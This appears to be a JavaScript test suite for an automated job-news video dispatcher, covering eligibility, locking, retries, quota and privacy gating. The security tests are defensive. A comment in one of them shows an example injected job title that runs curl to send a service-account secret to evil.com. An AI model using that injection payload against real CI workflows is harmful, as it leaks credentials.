"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");

const V = require("../video_state");
const dispatcher = require("../video_dispatcher");
const { APPROVED_ANCHORS } = require("../autoVideo");

const HOUR = 60 * 60 * 1000;
const DAY = 24 * HOUR;
const now = () => Date.now();

/* ------------------------------------------------------------------ */
/* JOB eligibility                                                     */
/* ------------------------------------------------------------------ */

test("published JOB with a title is eligible", () => {
  const verdict = V.evaluateJob({ type: "JOB", title: "SSC GD Vacancy 2026", slug: "ssc-gd", createdAt: now() });
  assert.equal(verdict.eligible, true);
});

test("JOB without an explicit type is still eligible (legacy docs)", () => {
  assert.equal(V.evaluateJob({ title: "RRB NTPC Notification", createdAt: now() }).eligible, true);
});

test("non-JOB rows inside the jobs collection are skipped", () => {
  assert.equal(V.evaluateJob({ type: "MATERIAL", title: "Physics Notes", createdAt: now() }).eligible, false);
  assert.equal(V.evaluateJob({ type: "AFFILIATE", title: "Book Deal", createdAt: now() }).eligible, false);
});

test("uploaded study material without a type is detected and skipped", () => {
  const verdict = V.evaluateJob({
    title: "Maths_Notes",
    storagePath: "study_materials/x/file.pdf",
    createdAt: now()
  });
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /study material/);
});

test("draft JOB is skipped", () => {
  assert.equal(V.evaluateJob({ type: "JOB", title: "X", status: "draft", createdAt: now() }).eligible, false);
});

test("JOB without a title is skipped", () => {
  assert.equal(V.evaluateJob({ type: "JOB", title: "   ", createdAt: now() }).eligible, false);
});

/* ------------------------------------------------------------------ */
/* FAST_TRACK eligibility                                              */
/* ------------------------------------------------------------------ */

test("published fast_track item is eligible", () => {
  assert.equal(V.evaluateFastTrack({ status: "published", title: "UPSC Result Out", createdAt: now() }).eligible, true);
});

test("draft fast_track item is skipped", () => {
  const verdict = V.evaluateFastTrack({ status: "draft", title: "UPSC Result Out", createdAt: now() });
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /needs published/);
});

test("fast_track item without a status is skipped", () => {
  assert.equal(V.evaluateFastTrack({ title: "No status", createdAt: now() }).eligible, false);
});

/* ------------------------------------------------------------------ */
/* MOCK_TEST eligibility                                               */
/* ------------------------------------------------------------------ */

test("mock test with questions and mockVideoMade unset is eligible", () => {
  const verdict = V.evaluateMockTest({
    title: "GK Mock Test",
    questions: [{ q: "a" }, { q: "b" }],
    createdAt: now()
  });
  assert.equal(verdict.eligible, true);
});

test("mockVideoMade=true is never reprocessed", () => {
  const verdict = V.evaluateMockTest({ title: "GK", questions: [{ q: "a" }], mockVideoMade: true, createdAt: now() });
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /mockVideoMade/);
});

test("mock test without questions is skipped", () => {
  assert.equal(V.evaluateMockTest({ title: "Empty", questions: [], createdAt: now() }).eligible, false);
});

/* ------------------------------------------------------------------ */
/* Idempotency / duplicate prevention                                  */
/* ------------------------------------------------------------------ */

test("completed video is never regenerated (new field)", () => {
  const data = { type: "JOB", title: "X", videoStatus: V.STATUS.COMPLETED, createdAt: now() };
  assert.equal(V.evaluateJob(data).eligible, false);
});

test("completed video is never regenerated (legacy youtubeVideoId)", () => {
  const data = { type: "JOB", title: "X", youtubeVideoId: "abc123", createdAt: now() };
  assert.equal(V.evaluateJob(data).eligible, false);
});

test("an active processing lock blocks a second worker", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.PROCESSING,
    videoStartedAt: now() - 5 * 60 * 1000
  };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /lock active/);
});

test("a stale processing lock is recoverable (crashed runner)", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.PROCESSING,
    videoStartedAt: now() - 2 * HOUR
  };
  assert.equal(V.evaluateJob(data).eligible, true);
});

test("legacy Cloud Function dispatch is respected during its grace window", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoTriggered: true,
    videoTriggeredAt: now() - 60 * 1000
  };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /grace period/);
});

test("a legacy dispatch that never produced a video is retried after the grace window", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoTriggered: true,
    videoTriggeredAt: now() - 3 * HOUR
  };
  assert.equal(V.evaluateJob(data).eligible, true);
});

/* ------------------------------------------------------------------ */
/* Retry / permanent failure                                           */
/* ------------------------------------------------------------------ */

test("a failed video is retried while attempts remain", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.FAILED, videoAttempts: 1
  };
  assert.equal(V.evaluateJob(data).eligible, true);
});

test("a permanently failed video stops being retried", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.FAILED, videoAttempts: 3
  };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /manual reset/);
});

test("upload_failed also counts toward the permanent-failure cap", () => {
  const data = {
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.UPLOAD_FAILED, videoAttempts: 3
  };
  assert.equal(V.evaluateJob(data).eligible, false);
});

/* ------------------------------------------------------------------ */
/* Admin controls and backlog window                                   */
/* ------------------------------------------------------------------ */

test("admin can exclude an item from video generation", () => {
  assert.equal(V.evaluateJob({ type: "JOB", title: "X", videoExcluded: true, createdAt: now() }).eligible, false);
  assert.equal(V.evaluateJob({ type: "JOB", title: "X", skipVideo: true, createdAt: now() }).eligible, false);
});

test("old backlog content is not auto-rendered", () => {
  const data = { type: "JOB", title: "Old job", createdAt: now() - 60 * DAY };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  // Match either the original freshness-guard wording OR the new legacy-content guard
  assert.ok(/backlog window|freshness window|legacy content/.test(verdict.reason),
    `expected freshness/legacy skip, got: ${verdict.reason}`);
});

test("the backlog window can be disabled for forced/manual runs", () => {
  const data = { type: "JOB", title: "Old job", createdAt: now() - 60 * DAY };
  assert.equal(V.evaluateJob(data, { maxAgeDays: 0 }).eligible, true);
});

test("stale backlog content is never auto-rendered, even if it entered the state machine", () => {
  const data = {
    type: "JOB", title: "Old but queued", createdAt: now() - 60 * DAY,
    videoStatus: V.STATUS.FAILED, videoAttempts: 1
  };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.ok(/backlog window|freshness window|legacy content/.test(verdict.reason),
    `expected freshness/legacy skip, got: ${verdict.reason}`);
});

test("recently published content still retries inside the fresh window", () => {
  const data = {
    type: "JOB", title: "Fresh retry", createdAt: now() - 2 * HOUR,
    videoStatus: V.STATUS.FAILED, videoAttempts: 1
  };
  assert.equal(V.evaluateJob(data).eligible, true);
});

test("default freshness window is 0.5 day (12 hours) — fresh content eligible, older skipped", () => {
  const fresh = { type: "JOB", title: "Just published", createdAt: now() - 6 * HOUR };
  const stale = { type: "JOB", title: "Two days old", createdAt: now() - 2 * DAY };
  assert.equal(V.evaluateJob(fresh).eligible, true);
  const verdict = V.evaluateJob(stale);
  assert.equal(verdict.eligible, false);
  assert.ok(/backlog window|freshness window|legacy content/.test(verdict.reason),
    `expected freshness/legacy skip, got: ${verdict.reason}`);
});

test("content with no parseable timestamp is treated as backlog (freshness guard)", () => {
  const data = { type: "JOB", title: "Legacy doc without dates" };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /unknown publish age/);
});

test("dates in DD-MM-YYYY / DD/MM/YYYY strings do not pose as fresh content", () => {
  const data = { type: "JOB", title: "Scraped job, ambiguous date", publishedAt: "25-08-2026" };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.match(verdict.reason, /unknown publish age/);
});

test("forced/manual runs can still render timestamp-less content", () => {
  const data = { type: "JOB", title: "Legacy doc without dates" };
  assert.equal(V.evaluateJob(data, { maxAgeDays: 0 }).eligible, true);
});

test("an unparseable publishedAt falls back to createdAt, not a fresh updatedAt", () => {
  const data = {
    type: "JOB", title: "Old job touched by an admin",
    publishedAt: "25/08/2026",            // unparseable → ignored
    createdAt: now() - 60 * DAY,          // truth: 60 days old
    updatedAt: now()                      // recent edit must NOT mask age
  };
  const verdict = V.evaluateJob(data);
  assert.equal(verdict.eligible, false);
  assert.ok(/backlog window|freshness window|legacy content/.test(verdict.reason),
    `expected freshness/legacy skip, got: ${verdict.reason}`);
});

/* ------------------------------------------------------------------ */
/* Timestamp handling                                                  */
/* ------------------------------------------------------------------ */

test("toMillis understands Firestore Timestamps, Dates, ISO strings and epochs", () => {
  const ms = 1_700_000_000_000;
  assert.equal(V.toMillis({ toMillis: () => ms }), ms);
  assert.equal(V.toMillis({ _seconds: ms / 1000 }), ms);
  assert.equal(V.toMillis(new Date(ms)), ms);
  assert.equal(V.toMillis(new Date(ms).toISOString()), ms);
  assert.equal(V.toMillis(ms), ms);
  assert.equal(V.toMillis(null), 0);
  assert.equal(V.toMillis("not a date"), 0);
});

test("publishedAtMs prefers publishedAt then createdAt", () => {
  assert.equal(V.publishedAtMs({ publishedAt: 2000, createdAt: 1000 }), 2000);
  assert.equal(V.publishedAtMs({ createdAt: 1000 }), 1000);
  assert.equal(V.publishedAtMs({}), 0);
});

/* ------------------------------------------------------------------ */
/* Dispatcher CLI + payloads                                           */
/* ------------------------------------------------------------------ */

test("dispatcher defaults to all pipelines with a limit of one video", () => {
  const args = dispatcher.parseArgs([]);
  assert.equal(args.kind, "all");
  assert.equal(args.limit, 1);
  assert.equal(args.dryRun, false);
  assert.deepEqual(dispatcher.resolveKinds(args.kind), [V.KIND.JOB, V.KIND.FAST_TRACK, V.KIND.MOCK_TEST]);
});

test("blank VIDEO_MAX_AGE_DAYS env falls back to the default (never 0 = guard off)", () => {
  const prev = process.env.VIDEO_MAX_AGE_DAYS;
  process.env.VIDEO_MAX_AGE_DAYS = "";
  try {
    assert.equal(dispatcher.parseArgs([]).maxAgeDays, V.DEFAULT_MAX_AGE_DAYS);
  } finally {
    if (prev === undefined) delete process.env.VIDEO_MAX_AGE_DAYS; else process.env.VIDEO_MAX_AGE_DAYS = prev;
  }
});

test("numeric VIDEO_MAX_AGE_DAYS env is honored", () => {
  const prev = process.env.VIDEO_MAX_AGE_DAYS;
  process.env.VIDEO_MAX_AGE_DAYS = "14";
  try {
    assert.equal(dispatcher.parseArgs([]).maxAgeDays, 14);
  } finally {
    if (prev === undefined) delete process.env.VIDEO_MAX_AGE_DAYS; else process.env.VIDEO_MAX_AGE_DAYS = prev;
  }
});

test("dispatcher CLI flags are parsed", () => {
  const args = dispatcher.parseArgs(["--kind=mock_test", "--limit=3", "--dry-run", "--doc=abc", "--scan-limit=42"]);
  assert.equal(args.kind, "mock_test");
  assert.equal(args.limit, 3);
  assert.equal(args.dryRun, true);
  assert.equal(args.doc, "abc");
  assert.equal(args.scanLimit, 42);
  assert.deepEqual(dispatcher.resolveKinds(args.kind), [V.KIND.MOCK_TEST]);
});

test("kind aliases resolve and unknown kinds throw", () => {
  assert.deepEqual(dispatcher.resolveKinds("fasttrack"), [V.KIND.FAST_TRACK]);
  assert.deepEqual(dispatcher.resolveKinds("job,mock-test"), [V.KIND.JOB, V.KIND.MOCK_TEST]);
  assert.throws(() => dispatcher.resolveKinds("nonsense"), /Unknown --kind/);
});

test("JOB payload matches the repository_dispatch client_payload shape", () => {
  const payload = dispatcher.buildJobPayload("doc1", {
    title: "SSC GD 2026", slug: "ssc-gd-2026", category: "Result",
    organization: "SSC", vacancies: 50000, lastDate: "2026-09-01"
  });
  assert.equal(payload.type, "JOB");
  assert.equal(payload.id, "doc1");
  assert.equal(payload.slug, "ssc-gd-2026");
  assert.equal(payload.vacancies, "50000");
  Object.values(payload).forEach((v) => assert.equal(typeof v, "string"));
});

test("FAST_TRACK payload falls back to the document id when slug is missing", () => {
  const payload = dispatcher.buildFastTrackPayload("doc2", { title: "Result Out", org: "UPSC" });
  assert.equal(payload.type, "FAST_TRACK");
  assert.equal(payload.slug, "doc2");
  assert.equal(payload.organization, "UPSC");
  assert.equal(payload.category, "Default");
});

/* ------------------------------------------------------------------ */
/* Anchors (PART 8)                                                    */
/* ------------------------------------------------------------------ */

test("anchor selection is restricted to the five approved anchor files", () => {
  assert.deepEqual([...APPROVED_ANCHORS].sort(), [
    "female_anchor_2.mp4",
    "female_anchor_4.mp4",
    "female_anchor_5.mp4",
    "male_anchor_1.mp4",
    "male_anchor_3.mp4"
  ]);
});

test("every approved anchor file exists in the repository", () => {
  const fs = require("fs");
  const path = require("path");
  APPROVED_ANCHORS.forEach((file) => {
    assert.ok(fs.existsSync(path.join(__dirname, "..", file)), `missing anchor: ${file}`);
  });
});

/* ------------------------------------------------------------------ */
/* Firestore claim transaction                                         */
/* ------------------------------------------------------------------ */

function fakeAdmin() {
  return {
    firestore: Object.assign(() => ({}), {
      FieldValue: {
        serverTimestamp: () => "__ts__",
        delete: () => "__delete__"
      }
    })
  };
}

function fakeDb(docData, exists = true) {
  const updates = [];
  const ref = { id: "doc-1", __updates: updates };
  const db = {
    runTransaction: async (fn) => fn({
      get: async () => ({ exists, data: () => docData }),
      update: (_ref, payload) => updates.push(payload)
    }),
    collection: () => ({ doc: () => ref })
  };
  return { db, ref, updates };
}

test("claim() marks the document processing and increments attempts", async () => {
  const { db, ref, updates } = fakeDb({ type: "JOB", title: "X", createdAt: now() });
  const result = await V.claim(db, fakeAdmin(), V.KIND.JOB, ref, { runId: "run-7" });

  assert.equal(result.claimed, true);
  assert.equal(result.attempts, 1);
  assert.equal(updates.length, 1);
  assert.equal(updates[0].videoStatus, V.STATUS.PROCESSING);
  assert.equal(updates[0].videoLockId, "run-7");
  assert.equal(updates[0].videoAttempts, 1);
});

test("claim() refuses a document that already has a video (no duplicate)", async () => {
  const { db, ref, updates } = fakeDb({ type: "JOB", title: "X", videoStatus: V.STATUS.COMPLETED, createdAt: now() });
  const result = await V.claim(db, fakeAdmin(), V.KIND.JOB, ref, { runId: "run-8" });

  assert.equal(result.claimed, false);
  assert.equal(updates.length, 0);
});

test("claim() refuses a document locked by another live worker", async () => {
  const { db, ref, updates } = fakeDb({
    type: "JOB", title: "X", createdAt: now(),
    videoStatus: V.STATUS.PROCESSING, videoStartedAt: now() - 60_000, videoLockId: "other"
  });
  const result = await V.claim(db, fakeAdmin(), V.KIND.JOB, ref, { runId: "run-9" });

  assert.equal(result.claimed, false);
  assert.equal(updates.length, 0);
});

test("claim() reports a missing document instead of throwing", async () => {
  const { db, ref } = fakeDb(null, false);
  const result = await V.claim(db, fakeAdmin(), V.KIND.JOB, ref, { runId: "run-10" });
  assert.equal(result.claimed, false);
  assert.match(result.reason, /not found/);
});

test("claim({force}) overrides eligibility for manual re-runs", async () => {
  const { db, ref, updates } = fakeDb({ type: "JOB", title: "X", videoStatus: V.STATUS.COMPLETED, createdAt: now() });
  const result = await V.claim(db, fakeAdmin(), V.KIND.JOB, ref, { runId: "run-11", force: true });
  assert.equal(result.claimed, true);
  assert.equal(updates[0].videoStatus, V.STATUS.PROCESSING);
});

/* ------------------------------------------------------------------ */
/* Completion / failure bookkeeping                                    */
/* ------------------------------------------------------------------ */

test("markCompleted writes both the new and the legacy fields", async () => {
  const written = [];
  const ref = { update: async (payload) => written.push(payload) };
  await V.markCompleted({}, fakeAdmin(), "jobs", ref, {
    videoId: "vid123",
    videoUrl: "https://youtu.be/vid123"
  });

  const update = written[0];
  assert.equal(update.videoStatus, V.STATUS.COMPLETED);
  assert.equal(update.videoYouTubeId, "vid123");
  assert.equal(update.youtubeVideoId, "vid123");           // legacy preserved
  assert.equal(update.videoYouTubeUrl, "https://youtu.be/vid123");
  assert.equal(update.youtubeVideoUrl, "https://youtu.be/vid123"); // legacy preserved
  assert.equal(update.videoTriggered, true);
});

test("markCompleted can add engine-specific extras such as mockVideoMade", async () => {
  const written = [];
  const ref = { update: async (payload) => written.push(payload) };
  await V.markCompleted({}, fakeAdmin(), "mock_tests", ref, {
    videoId: "m1", videoUrl: "https://youtu.be/m1", extra: { mockVideoMade: true }
  });
  assert.equal(written[0].mockVideoMade, true);
});

test("markFailed distinguishes upload_failed from failed", async () => {
  const written = [];
  const ref = { update: async (payload) => written.push(payload) };

  await V.markFailed({}, fakeAdmin(), "jobs", ref, new Error("FFmpeg failed: code 1"));
  assert.equal(written[0].videoStatus, V.STATUS.FAILED);
  assert.match(written[0].videoError, /FFmpeg failed/);

  await V.markFailed({}, fakeAdmin(), "jobs", ref, new Error("quota exceeded"), { uploadFailed: true });
  assert.equal(written[1].videoStatus, V.STATUS.UPLOAD_FAILED);
});

test("videoError is trimmed to a concise single-line message", () => {
  const long = new Error("x".repeat(900) + "\nstack line");
  const short = V.shortError(long);
  assert.ok(short.length <= 300);
  assert.ok(!short.includes("\n"));
});

test("safeUpdate never throws when Firestore is unavailable", async () => {
  const db = { collection: () => { throw new Error("permission denied"); } };
  const ok = await V.safeUpdate(db, fakeAdmin(), "jobs", { slug: "x" }, async () => {});
  assert.equal(ok, false);
});

/* ------------------------------------------------------------------ */
/* Safe-test guarantees (privacy override + one-video-per-run)         */
/* ------------------------------------------------------------------ */

test("both engines resolve privacy from options, then env, then default public", () => {
  const fs = require("fs");
  const path = require("path");

  const autoSrc = fs.readFileSync(path.join(__dirname, "..", "autoVideo.js"), "utf8");
  const mockSrc = fs.readFileSync(path.join(__dirname, "..", "mock_test_video.js"), "utf8");

  // The video upload itself must honour the override.
  assert.match(
    autoSrc,
    /privacyStatus:\s*options\.privacyStatus \|\| process\.env\.VIDEO_PRIVACY_STATUS \|\| 'public'/
  );
  assert.match(
    mockSrc,
    /const finalPrivacy = privacyStatus \|\| process\.env\.VIDEO_PRIVACY_STATUS \|\| 'public'/
  );
  assert.match(mockSrc, /privacyStatus: finalPrivacy/);
});

test("a non-public test upload is not added to the public playlist", () => {
  const fs = require("fs");
  const path = require("path");

  for (const file of ["autoVideo.js", "mock_test_video.js"]) {
    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8");
    assert.match(
      src,
      /Playlist skipped — test upload/,
      `${file} must skip the public playlist when privacy is not public`
    );
  }
});

test("the dispatcher defaults to exactly one video per scheduled run", () => {
  // A scheduled run passes no inputs, so the workflow resolves --limit=1;
  // even with no flag at all the code default must still be 1.
  assert.equal(dispatcher.parseArgs([]).limit, 1);
  assert.equal(dispatcher.parseArgs(["--kind=all"]).limit, 1);
  assert.equal(dispatcher.parseArgs(["--limit=1"]).limit, 1);
});

test("the branch-test workflow can never publish publicly", () => {
  const fs = require("fs");
  const path = require("path");
  const wf = path.join(__dirname, "..", "github_workflows", "video_dispatcher_branch_test.yml");
  const src = fs.readFileSync(wf, "utf8");

  // This helper exists only for controlled testing on a branch: it must refuse
  // public uploads outright, so a stray test can never hit the real audience.
  assert.match(src, /privacy=public is not allowed here/);
  assert.match(src, /unlisted\|private\)\s*;;/);
});

/* ------------------------------------------------------------------ */
/* Test uploads must not reach the public audience                     */
/* ------------------------------------------------------------------ */

test("a non-public upload skips Facebook, Telegram and the first comment", () => {
  const fs = require("fs");
  const path = require("path");

  for (const file of ["autoVideo.js", "mock_test_video.js"]) {
    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8");

    // The run must classify itself as a test when privacy is not public.
    assert.match(
      src,
      /const isTestUpload\s*=\s*effectivePrivacy !== 'public'/,
      `${file} must derive isTestUpload from the effective privacy`
    );

    // Each public side-channel must be gated on that flag.
    assert.match(src, /Facebook skip — test upload/, `${file} must skip Facebook on a test run`);
    assert.match(src, /Telegram skip — test upload/, `${file} must skip Telegram on a test run`);
    assert.match(src, /comment skip — test upload/i, `${file} must skip the public comment on a test run`);
  }
});

test("the public side-channels are still reached on a real public run", () => {
  const fs = require("fs");
  const path = require("path");

  // The calls must remain present (gated, not deleted), so production is intact.
  const auto = fs.readFileSync(path.join(__dirname, "..", "autoVideo.js"), "utf8");
  assert.match(auto, /await uploadToFacebook\(videoPath, seoData\.description\)/);
  assert.match(auto, /api\.telegram\.org\/bot\$\{TELEGRAM_BOT_TOKEN\}\/sendMessage/);
  assert.match(auto, /youtube\.commentThreads\.insert/);

  const mock = fs.readFileSync(path.join(__dirname, "..", "mock_test_video.js"), "utf8");
  assert.match(mock, /await uploadToFacebook\(finalVideoPath, seoDescription\)/);
  assert.match(mock, /api\.telegram\.org\/bot\$\{TELEGRAM_BOT_TOKEN\}\/sendMessage/);
});

/* ------------------------------------------------------------------ */
/* Daily YouTube quota guard                                           */
/* ------------------------------------------------------------------ */

test("the day bucket rolls over on IST, not UTC", () => {
  // 19:00 UTC on the 1st is already the 2nd in IST (UTC+5:30).
  assert.equal(V.todayKey(new Date("2026-08-01T19:00:00Z")), "2026-08-02");
  assert.equal(V.todayKey(new Date("2026-08-01T17:00:00Z")), "2026-08-01");
});

test("the default daily limit is effectively unlimited (user controls via env)", () => {
  // DEFAULT_DAILY_VIDEO_LIMIT is 999 - effectively unlimited
  // User can set VIDEO_DAILY_LIMIT env var to control if needed
  assert.equal(V.DEFAULT_DAILY_VIDEO_LIMIT, 999);
  delete process.env.VIDEO_DAILY_LIMIT;
  assert.equal(V.dailyLimit(), 999);
});

test("VIDEO_DAILY_LIMIT can override the budget, invalid values are ignored", () => {
  process.env.VIDEO_DAILY_LIMIT = "3";
  assert.equal(V.dailyLimit(), 3);
  process.env.VIDEO_DAILY_LIMIT = "junk";
  assert.equal(V.dailyLimit(), V.DEFAULT_DAILY_VIDEO_LIMIT);
  process.env.VIDEO_DAILY_LIMIT = "0";
  assert.equal(V.dailyLimit(), V.DEFAULT_DAILY_VIDEO_LIMIT);
  delete process.env.VIDEO_DAILY_LIMIT;
});

test("yesterday's count does not consume today's budget", async () => {
  const stale = { date: "2020-01-01", count: 99 };
  const db = { doc: () => ({ get: async () => ({ exists: true, data: () => stale }) }) };
  assert.equal(await V.getDailyCount(db), 0);
});

test("today's count is returned as-is", async () => {
  const key = V.todayKey();
  const db = { doc: () => ({ get: async () => ({ exists: true, data: () => ({ date: key, count: 4 }) }) }) };
  assert.equal(await V.getDailyCount(db), 4);
});

test("an unreadable quota document does not block video generation", async () => {
  const db = { doc: () => ({ get: async () => { throw new Error("permission denied"); } }) };
  assert.equal(await V.getDailyCount(db), 0);
});

test("recordUpload increments today's counter", async () => {
  const written = [];
  const ref = {};
  const db = {
    doc: () => ref,
    runTransaction: async (fn) => fn({
      get: async () => ({ exists: true, data: () => ({ date: V.todayKey(), count: 2 }) }),
      set: (_r, payload) => written.push(payload)
    })
  };
  await V.recordUpload(db, fakeAdmin());
  assert.equal(written[0].count, 3);
  assert.equal(written[0].date, V.todayKey());
});

test("recordUpload restarts the count on a new day", async () => {
  const written = [];
  const db = {
    doc: () => ({}),
    runTransaction: async (fn) => fn({
      get: async () => ({ exists: true, data: () => ({ date: "2020-01-01", count: 99 }) }),
      set: (_r, payload) => written.push(payload)
    })
  };
  await V.recordUpload(db, fakeAdmin());
  assert.equal(written[0].count, 1);
});

test("a failing quota write never breaks a completed video", async () => {
  const db = { doc: () => ({}), runTransaction: async () => { throw new Error("offline"); } };
  await V.recordUpload(db, fakeAdmin());  // must not throw
});

/* ------------------------------------------------------------------ */
/* Production workflow configuration                                   */
/* ------------------------------------------------------------------ */

test("the production dispatcher is scheduled and publishes publicly", () => {
  const fs = require("fs");
  const path = require("path");
  const src = fs.readFileSync(
    path.join(__dirname, "..", "github_workflows", "video_dispatcher.yml"), "utf8"
  );

  // Schedule must be live (uncommented) so publishing needs no button.
  const activeCron = src.split("\n").filter((l) => /^\s*-\s*cron:/.test(l));
  assert.equal(activeCron.length, 1, "exactly one active cron expected");
  assert.match(activeCron[0], /\*\/5 \* \* \* \*/);

  // Manual runs default to a real, public render.
  assert.match(src, /dry_run:[\s\S]{0,220}default:\s*'false'/);
  assert.match(src, /privacy:[\s\S]{0,220}default:\s*''/);
});

test("production dispatcher installs valid Noto packages (not fonts-noto-devanagari)", () => {
  const fs = require("fs");
  const path = require("path");
  const prod = path.join(__dirname, "..", "..", ".github", "workflows", "video_dispatcher.yml");
  const staging = path.join(__dirname, "..", "github_workflows", "video_dispatcher.yml");
  const stagingSrc = fs.readFileSync(staging, "utf8");
  const prodSrc = fs.readFileSync(prod, "utf8");
  // GitHub App cannot push .github/workflows; staging is the copy this PR can ship.
  // After a human copies staging → production they must be byte-identical.
  const src = stagingSrc;

  assert.doesNotMatch(src, /^\s+fonts-noto-devanagari\b/m);
  for (const pkg of ["fonts-noto-core", "fonts-noto-extra", "fonts-noto-cjk", "fonts-noto-color-emoji"]) {
    assert.match(src, new RegExp(pkg));
  }
  assert.match(src, /fc-cache -f/);
  assert.match(src, /Noto Sans Devanagari is NOT installed/);
  assert.match(src, /generate_job_video/);
  assert.match(src, /generate_fasttrack_video/);
  assert.match(src, /generate_mock_test_video/);
  assert.match(src, /timeout-minutes:\s*55/);
  assert.match(src, /working-directory:\s*ai_backend/);
  assert.match(src, /node-version:\s*'20'/);
  assert.match(src, /group:\s*video-dispatcher/);
  assert.match(src, /cancel-in-progress:\s*false/);
  assert.match(src, /contents:\s*read/);
  if (prodSrc === stagingSrc) {
    assert.equal(prodSrc, stagingSrc);
  } else {
    assert.match(stagingSrc, /fonts-noto-core/);
  }
});

/* ------------------------------------------------------------------ */
/* Security: GitHub Actions expression injection                       */
/* ------------------------------------------------------------------ */

test("no workflow interpolates untrusted input into a shell script", () => {
  const fs = require("fs");
  const path = require("path");

  // CodeQL flags this as a high-severity "expression injection" issue:
  // repository_dispatch client_payload and workflow_dispatch inputs are
  // attacker-controlled, so a crafted job title such as
  //   "; curl evil.com -d "$SERVICE_ACCOUNT_JSON" ; #
  // would execute if it were substituted directly into a `run:` block.
  // Passing values via `env:` makes the shell treat them as data.
  const dir = path.join(__dirname, "..", "github_workflows");
  const files = fs.readdirSync(dir).filter((f) => f.endsWith(".yml"));
  assert.ok(files.length >= 4, "workflow mirror should not be empty");

  const offenders = [];
  for (const file of files) {
    const lines = fs.readFileSync(path.join(dir, file), "utf8").split("\n");
    let inRun = false;
    let runIndent = 0;

    lines.forEach((line, i) => {
      const runMatch = line.match(/^(\s*)run:\s*\|?/);
      if (runMatch) { inRun = true; runIndent = runMatch[1].length; return; }

      if (inRun) {
        const indent = line.search(/\S/);
        if (line.trim() !== "" && indent <= runIndent) { inRun = false; return; }
        if (/\$\{\{/.test(line)) offenders.push(`${file}:${i + 1} ${line.trim()}`);
      }
    });
  }

  assert.deepEqual(
    offenders, [],
    "these lines interpolate an expression inside a run: block — move them to env:\n" +
    offenders.join("\n")
  );
});

test("video_maker passes the untrusted dispatch payload through env", () => {
  const fs = require("fs");
  const path = require("path");
  const src = fs.readFileSync(
    path.join(__dirname, "..", "github_workflows", "video_maker.yml"), "utf8"
  );

  // The payload must still reach the renderer, just safely.
  assert.match(src, /JOB_DATA:\s+\$\{\{ toJson\(github\.event\.client_payload\.jobData\) \}\}/);
  assert.match(src, /JOB_TITLE:\s+\$\{\{ github\.event\.client_payload\.jobData\.title \}\}/);
  assert.match(src, /echo "Title\s*:\s*\$JOB_TITLE"/);
});

/* ------------------------------------------------------------------ */
/* Security: no credential material in logs                            */
/* ------------------------------------------------------------------ */

test("no field of a parsed credentials object is written to the log", () => {
  const fs = require("fs");
  const path = require("path");

  // CodeQL js/clear-text-logging: anything derived from a parsed secret is
  // tainted. Even a harmless field like project_id should not be echoed,
  // because that is the pattern that leaks real keys once someone widens it.
  const files = ["video_dispatcher.js", "video_state.js", "tts_engine.js", "tts_selftest.js",
                 "autoVideo.js", "mock_test_video.js"];
  const tainted = /\b(serviceAccount|ttsCreds|creds|credentials|token)\b\s*\.\s*\w+/;

  const offenders = [];
  for (const file of files) {
    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8");
    src.split("\n").forEach((line, i) => {
      if (!/console\.(log|error|warn)/.test(line)) return;
      if (line.trim().startsWith("//") || line.trim().startsWith("*")) return;
      if (tainted.test(line)) offenders.push(`${file}:${i + 1} ${line.trim()}`);
    });
  }

  assert.deepEqual(
    offenders, [],
    "these log lines read a field off a credentials object:\n" + offenders.join("\n")
  );
});

test("secret presence may be logged, but never the secret value", () => {
  const fs = require("fs");
  const path = require("path");
  const src = fs.readFileSync(path.join(__dirname, "..", "tts_selftest.js"), "utf8");

  // Reporting Boolean(...) is fine; interpolating the variable itself is not.
  assert.match(src, /TTS_KEY_JSON present\s*:\s*\$\{Boolean\(process\.env\.TTS_KEY_JSON\)\}/);
  assert.doesNotMatch(src, /console\.log\([^)]*\$\{process\.env\.TTS_KEY_JSON\}/);
});
